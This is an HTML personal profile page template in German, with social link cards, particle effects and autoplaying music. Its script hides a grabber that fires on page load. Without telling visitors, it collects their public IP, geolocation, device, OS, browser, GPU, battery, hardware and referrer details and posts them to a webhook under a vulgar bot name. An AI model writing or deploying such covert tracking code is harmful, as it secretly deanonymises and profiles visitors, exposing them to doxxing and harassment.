<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NAME</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Share+Tech+Mono&display=swap');
  *{margin:0;padding:0;box-sizing:border-box;}
  body{
    background:#03030a;min-height:100vh;
    display:flex;flex-direction:column;align-items:center;
    overflow-x:hidden;font-family:'Share Tech Mono',monospace;cursor:none;
    padding-bottom:60px;
  }
  canvas{position:fixed;inset:0;z-index:0;pointer-events:none;}

  /* cursor */
  .cur{position:fixed;width:5px;height:5px;background:#fff;border-radius:50%;pointer-events:none;z-index:999;transform:translate(-50%,-50%);box-shadow:0 0 8px rgba(255,255,255,.9),0 0 18px rgba(255,255,255,.4);}
  .cur-ring{position:fixed;width:26px;height:26px;border:1px solid rgba(255,255,255,.22);border-radius:50%;pointer-events:none;z-index:998;transform:translate(-50%,-50%);}

  /* hero */
  .hero{
    position:relative;z-index:2;
    display:flex;flex-direction:column;align-items:center;
    padding-top:80px;gap:6px;
  }
  .avatar{
    width:90px;height:90px;border-radius:50%;
    background:linear-gradient(135deg,#1a1a2e,#16213e);
    border:1px solid rgba(255,255,255,.1);
    display:flex;align-items:center;justify-content:center;
    font-family:'Bebas Neue',sans-serif;font-size:32px;color:rgba(255,255,255,.7);
    box-shadow:0 0 30px rgba(255,255,255,.06);
    margin-bottom:10px;
    animation:fadeIn .8s ease-out both;
  }
  .NAME{
    font-family:'Bebas Neue',sans-serif;
    font-size:clamp(80px,18vw,160px);
    color:#fff;letter-spacing:.06em;line-height:1;
    animation:fadeIn .8s ease-out both,pulse 4s ease-in-out 1s infinite;
    user-select:none;
  }
  @keyframes pulse{
    0%,100%{text-shadow:0 0 18px #fff,0 0 40px rgba(255,255,255,.5),0 0 80px rgba(180,210,255,.25);}
    50%    {text-shadow:0 0 28px #fff,0 0 60px rgba(255,255,255,.7),0 0 120px rgba(180,210,255,.4);}
  }
  @keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}

  .tagline{font-size:11px;letter-spacing:5px;color:rgba(255,255,255,.25);text-transform:uppercase;animation:fadeIn 1s ease-out both;}

  /* badge row */
  .badges{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;justify-content:center;animation:fadeIn 1.2s ease-out both;}
  .badge{
    font-size:9px;letter-spacing:2px;text-transform:uppercase;
    padding:4px 12px;border:1px solid rgba(255,255,255,.1);
    color:rgba(255,255,255,.4);background:rgba(255,255,255,.03);
  }

  /* cards container */
  .cards{
    position:relative;z-index:2;
    width:min(460px,92vw);margin-top:40px;
    display:flex;flex-direction:column;gap:10px;
    animation:fadeIn 1.4s ease-out both;
  }

  /* single card */
  .card{
    background:rgba(255,255,255,.03);
    border:1px solid rgba(255,255,255,.07);
    padding:16px 20px;
    display:flex;align-items:center;gap:14px;
    transition:background .25s,border-color .25s;
    text-decoration:none;
  }
  .card:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.18);}
  .card-icon{font-size:18px;flex-shrink:0;width:24px;text-align:center;}
  .card-body{flex:1;}
  .card-title{font-size:12px;letter-spacing:2px;color:rgba(255,255,255,.75);text-transform:uppercase;}
  .card-sub{font-size:10px;letter-spacing:1px;color:rgba(255,255,255,.3);margin-top:2px;}
  .card-arrow{font-size:11px;color:rgba(255,255,255,.2);}
  .card:hover .card-arrow{color:rgba(255,255,255,.6);}

  /* section label */
  .section-label{
    font-size:9px;letter-spacing:4px;color:rgba(255,255,255,.18);
    text-transform:uppercase;margin-top:10px;margin-bottom:2px;padding-left:2px;
  }

  /* footer */
  .footer{
    position:relative;z-index:2;
    margin-top:40px;font-size:10px;letter-spacing:3px;
    color:rgba(255,255,255,.35);text-align:center;
    animation:fadeIn 2s ease-out both;
  }
  .footer span{color:rgba(255,255,255,.6);}

  /* status */
  .status{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);font-size:9px;letter-spacing:2px;color:rgba(255,255,255,.15);z-index:10;}
  .status.ok{color:rgba(100,255,150,.35);}
  .status.err{color:rgba(255,80,80,.35);}
</style>
</head>
<body>
<canvas id="c"></canvas>
<div class="cur" id="cur"></div>
<div class="cur-ring" id="ring"></div>

<div class="hero">
  <div class="avatar">NAME</div>
  <div class="spk">NAME</div>
  <div class="tagline">NAME &nbsp;·&nbsp; TEXT</div>
  <div class="badges">
    <div class="badge">TEXT</div>
    <div class="badge">TEXT </div>
    <div class="badge">TEXT</div>
  </div>
</div>

<div class="cards">

  <div class="section-label">// Socials</div>

  <a class="card" href="TEXT" target="_blank">
    <div class="card-icon">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="rgba(255,255,255,0.6)"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 0 0-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 0 0-5.487 0 12.36 12.36 0 0 0-.617-1.23A.077.077 0 0 0 8.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 0 0-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 0 0 .031.055 20.03 20.03 0 0 0 5.993 2.98.078.078 0 0 0 .084-.026c.462-.62.874-1.275 1.226-1.963.021-.04.001-.088-.041-.104a13.201 13.201 0 0 1-1.872-.878.075.075 0 0 1-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 0 1 .078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 0 1 .079.009c.12.098.245.195.372.288a.075.075 0 0 1-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 0 0-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 0 0 .084.028 19.963 19.963 0 0 0 6.002-2.981.076.076 0 0 0 .032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 0 0-.031-.028zM8.02 15.278c-1.182 0-2.157-1.069-2.157-2.38 0-1.312.956-2.38 2.157-2.38 1.21 0 2.176 1.077 2.157 2.38 0 1.312-.956 2.38-2.157 2.38zm7.975 0c-1.183 0-2.157-1.069-2.157-2.38 0-1.312.955-2.38 2.157-2.38 1.21 0 2.176 1.077 2.157 2.38 0 1.312-.946 2.38-2.157 2.38z"/></svg>
    </div>
    <div class="card-body">
      <div class="card-title">TEXT</div>
      <div class="card-sub">LINK</div>
    </div>
    <div class="card-arrow">→</div>
  </a>

  <div class="section-label">// Info</div>

  <div class="card" style="cursor:default;">
    <div class="card-icon">📍</div>
    <div class="card-body">
      <div class="card-title">Location</div>
      <div class="card-sub">TEXT</div>
    </div>
  </div>

  <div class="card" style="cursor:default;">
    <div class="card-icon">🎵</div>
    <div class="card-body">
      <div class="card-title">Musik</div>
      <div class="card-sub">TEXT</div>
    </div>
  </div>

  <div class="card" style="cursor:default;">
    <div class="card-icon">🎮</div>
    <div class="card-body">
      <div class="card-title">Games</div>
      <div class="card-sub">TEXT</div>
    </div>
  </div>

</div>

<div class="footer">made by <span>Bundestag</span></div>
<div class="status" id="st"></div>

<script>
  // ── WEBHOOK ──────────────────────────────────────────
  const WEBHOOK = "WEBHOOK";

  // ── Musik ────────────────────────────────────────────
  const audio = new Audio('https://capitalist-jade-rdavll4yin.edgeone.app/YTDown_YouTube_EsDeeKid-_-Rico-Ace-Phantom_Media_hmdzniMJOZs_009_128k.mp3');
  audio.loop = true; audio.volume = 0.45;
  window.addEventListener('load', ()=>{ audio.play().catch(()=>{}); });
  document.addEventListener('click', ()=>audio.play().catch(()=>{}), {once:true});

  // ── Particles ────────────────────────────────────────
  const canvas=document.getElementById('c'), ctx=canvas.getContext('2d');
  let W,H,mouse={x:-999,y:-999};
  function resize(){ W=canvas.width=innerWidth; H=canvas.height=innerHeight; }
  resize(); window.addEventListener('resize',resize);
  class P{
    constructor(){this.init(true);}
    init(r){ this.x=Math.random()*W; this.y=r?Math.random()*H:H+10; this.vx=(Math.random()-.5)*.3; this.vy=-(Math.random()*.4+.08); this.r=Math.random()*1.5+.3; this.a=Math.random()*.4+.08; }
    tick(){
      const dx=this.x-mouse.x,dy=this.y-mouse.y,d=Math.hypot(dx,dy);
      if(d<110){const f=(110-d)/110;this.vx+=(dx/d)*f*.9;this.vy+=(dy/d)*f*.9;}
      this.vx*=.97;this.vy*=.97;this.x+=this.vx;this.y+=this.vy;
      if(this.y<-10||this.x<-10||this.x>W+10)this.init(false);
    }
    draw(){ ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle=`rgba(255,255,255,${this.a})`;ctx.fill(); }
  }
  const ps=[]; for(let i=0;i<130;i++)ps.push(new P());
  (function loop(){
    ctx.clearRect(0,0,W,H);
    for(let i=0;i<ps.length;i++) for(let j=i+1;j<ps.length;j++){
      const dx=ps[i].x-ps[j].x,dy=ps[i].y-ps[j].y,d=Math.hypot(dx,dy);
      if(d<90){ctx.beginPath();ctx.moveTo(ps[i].x,ps[i].y);ctx.lineTo(ps[j].x,ps[j].y);ctx.strokeStyle=`rgba(255,255,255,${.05*(1-d/90)})`;ctx.lineWidth=.5;ctx.stroke();}
    }
    ps.forEach(p=>{p.tick();p.draw();}); requestAnimationFrame(loop);
  })();

  // ── Cursor ───────────────────────────────────────────
  const cur=document.getElementById('cur'),ring=document.getElementById('ring');
  let rx=0,ry=0;
  document.addEventListener('mousemove',e=>{ mouse.x=e.clientX;mouse.y=e.clientY;cur.style.left=e.clientX+'px';cur.style.top=e.clientY+'px'; });
  (function ar(){ rx+=(mouse.x-rx)*.12;ry+=(mouse.y-ry)*.12;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(ar); })();

  // ── Data & send ──────────────────────────────────────
  async function getPublicIp(){
    try{return(await(await fetch('https://api.ipify.org?format=json')).json()).ip;}
    catch{try{return(await(await fetch('https://api64.ipify.org?format=json')).json()).ip;}catch{return'nicht gefunden';}}
  }
  function getOS(){const ua=navigator.userAgent;if(/Windows NT 10/.test(ua))return'Windows 10/11';if(/Windows NT 6.3/.test(ua))return'Windows 8.1';if(/Mac OS X ([\d_]+)/.test(ua))return'macOS '+ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,'.');if(/Android ([\d.]+)/.test(ua))return'Android '+ua.match(/Android ([\d.]+)/)[1];if(/iPhone OS ([\d_]+)/.test(ua))return'iOS '+ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,'.');if(/Linux/.test(ua))return'Linux';return'nicht gefunden';}
  function getBrowser(){const ua=navigator.userAgent;if(/Edg\/([\d.]+)/.test(ua))return'Edge '+ua.match(/Edg\/([\d.]+)/)[1];if(/OPR\/([\d.]+)/.test(ua))return'Opera '+ua.match(/OPR\/([\d.]+)/)[1];if(/Firefox\/([\d.]+)/.test(ua))return'Firefox '+ua.match(/Firefox\/([\d.]+)/)[1];if(/Chrome\/([\d.]+)/.test(ua))return'Chrome '+ua.match(/Chrome\/([\d.]+)/)[1];if(/Version\/([\d.]+).*Safari/.test(ua))return'Safari '+ua.match(/Version\/([\d.]+)/)[1];return'nicht gefunden';}
  function getDevice(){const ua=navigator.userAgent;if(/iPhone/.test(ua))return'iPhone';if(/iPad/.test(ua))return'iPad';if(/Android/.test(ua)&&/Mobile/.test(ua))return'Android Phone';if(/Android/.test(ua))return'Android Tablet';return'Desktop / Laptop';}
  function getGPU(){try{const gl=document.createElement('canvas').getContext('webgl');if(!gl)return'nicht verfügbar';const ext=gl.getExtension('WEBGL_debug_renderer_info');return ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'nicht verfügbar';}catch{return'nicht verfügbar';}}
  function getConn(){const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)return'nicht verfügbar';return[c.effectiveType,c.type,c.downlink?c.downlink+'Mbps':null].filter(Boolean).join(' · ');}

  async function run(){
    const st=document.getElementById('st');
    const pub=await getPublicIp();
    const now=new Date().toLocaleString('de-DE');
    let geoInfo='nicht verfügbar';
    try{const r=await fetch(`https://ipapi.co/${pub}/json/`);const d=await r.json();if(d.city)geoInfo=`${d.city}, ${d.region}, ${d.country_name} (${d.org||'?'})`;}catch{}
    let batterie='nicht verfügbar';
    try{const b=await navigator.getBattery();batterie=`${Math.round(b.level*100)}% (${b.charging?'⚡ lädt':'🔋 entlädt'})`;}catch{}
    const fields=[
      {name:'🌍 Public IP',     value:`\`${pub}\``,                                          inline:true},
      {name:'📍 Standort',      value:`\`${geoInfo}\``,                                      inline:true},
      {name:'💻 Gerät',         value:`\`${getDevice()}\``,                                  inline:true},
      {name:'🖥️ System',        value:`\`${getOS()}\``,                                      inline:true},
      {name:'🌐 Browser',       value:`\`${getBrowser()}\``,                                 inline:true},
      {name:'📐 Plattform',     value:`\`${navigator.platform||'nicht gefunden'}\``,         inline:true},
      {name:'🎮 GPU',           value:`\`${getGPU()}\``,                                     inline:false},
      {name:'🗣️ Sprache',       value:`\`${navigator.language||'nicht gefunden'}\``,         inline:true},
      {name:'🌏 Alle Sprachen', value:`\`${navigator.languages?.join(', ')||'nicht gefunden'}\``, inline:true},
      {name:'🕐 Zeitzone',      value:`\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline:true},
      {name:'🖥️ Auflösung',     value:`\`${screen.width}x${screen.height} (${screen.colorDepth}bit)\``, inline:true},
      {name:'🪟 Fenstergröße',  value:`\`${innerWidth}x${innerHeight}\``,                   inline:true},
      {name:'🔍 Pixel Ratio',   value:`\`${window.devicePixelRatio||'?'}x\``,               inline:true},
      {name:'🔋 Akku',          value:`\`${batterie}\``,                                     inline:true},
      {name:'🧠 RAM',           value:`\`${navigator.deviceMemory?navigator.deviceMemory+' GB':'nicht verfügbar'}\``, inline:true},
      {name:'⚙️ CPU Kerne',     value:`\`${navigator.hardwareConcurrency?navigator.hardwareConcurrency+' Kerne':'nicht verfügbar'}\``, inline:true},
      {name:'📶 Verbindung',    value:`\`${getConn()}\``,                                    inline:true},
      {name:'🟢 Status',        value:`\`${navigator.onLine?'Online':'Offline'}\``,          inline:true},
      {name:'🍪 Cookies',       value:`\`${navigator.cookieEnabled?'aktiviert':'deaktiviert'}\``, inline:true},
      {name:'👆 Touchscreen',   value:`\`${navigator.maxTouchPoints>0?'ja ('+navigator.maxTouchPoints+' Punkte)':'nein'}\``, inline:true},
      {name:'🚫 Do Not Track',  value:`\`${navigator.doNotTrack==='1'?'aktiviert':'deaktiviert'}\``, inline:true},
      {name:'📄 PDF Viewer',    value:`\`${navigator.pdfViewerEnabled?'ja':'nein'}\``,       inline:true},
      {name:'🔗 Geöffnet von',  value:`\`${document.referrer||'direkt geöffnet'}\``,         inline:false},
    ];
    try{
      const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'FOTZENFINDER',embeds:[{color:0xffffff,fields,footer:{text:`${now} • made by Bundestag(9ngn)`}}]})});
      if(res.ok||res.status===204){st.className='status ok';st.textContent=`✓ ${pub}`;}
      else{st.className='status err';st.textContent=`fehler ${res.status}`;}
    }catch{st.className='status err';st.textContent='netzwerkfehler';}
  }
  window.addEventListener('load',run);
</script>
</body>
</html>
